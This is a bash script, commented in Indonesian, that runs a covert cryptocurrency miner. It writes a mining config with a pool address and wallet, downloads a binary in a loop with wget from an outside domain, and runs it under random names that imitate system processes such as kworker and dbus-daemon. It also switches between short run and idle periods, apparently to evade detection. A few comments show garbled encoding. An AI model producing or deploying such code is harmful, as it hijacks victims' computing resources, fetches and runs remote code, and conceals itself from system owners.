#!/bin/bash


# Konfigurasi default (nanti disimpan ke file config dengan nama sesuai bin)
CONFIG_JSON='{
  "algo": "power2b",
  "url": "52.15.50.214:443",
  "user": "mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabar777",
  "pass": "x",
  "threads": 8
}'

# Daftar kemungkinan nama binary
POSSIBLE_NAMES=("dbus-daemon" "pulseaudio" "systemd-helper" "gvfsd" \
"gnome-session" "kworker" "migration" "watchdog")

# Lokasi penyimpanan
LOCAL_BIN_DIR="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN_DIR"

while true; do
    # Hapus data sesi lama
    rm -f "$LOCAL_BIN_DIR"/*

    # Pilih nama binary acak
    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config.json"

    # Simpan config JSON sesuai nama bin
    echo "$CONFIG_JSON" > "$CONFIG_PATH"


    # Download binary baru
    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME"
    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME"

    # Tentukan waktu aktif (2ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Å“3 menit)
    ACTIVE_MIN=$((RANDOM % 2 + 2))
    ACTIVE_SEC=$((ACTIVE_MIN * 60))


    # Tentukan waktu istirahat (20ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Å“30 detik)
    IDLE_SEC=$((RANDOM % 11 + 20))


    # Jalankan proses dengan timeout
    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME" --config="$CONFIG_PATH" >/dev/null 2>&1


    # Istirahat
  sleep "$IDLE_SEC"
done 
